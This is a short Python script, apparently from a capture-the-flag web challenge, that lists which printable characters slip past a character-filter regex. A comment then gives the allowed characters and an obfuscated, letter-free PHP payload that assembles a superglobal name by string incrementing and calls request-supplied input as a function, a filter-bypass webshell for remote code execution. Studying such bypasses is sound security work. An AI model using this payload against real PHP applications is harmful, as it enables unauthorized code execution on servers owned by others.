import re

pattern=r"[a-zA-Z0-9!'@#%^&*:{}\-<\?>\"|`~\\\\]"

for i in range(32,127):
    if re.match(pattern,chr(i)) is None:
        print(chr(i))


'''
 
$
(
)
+
,
.
/
;
=
[
]



<?PHP
$_=_(%FA.%FA)[_];$%FA=++$_;$$%FA[$%FA=_.++$_.$%FA[$_++/$_++].++$_.++$_]($$%FA[_]);


'''

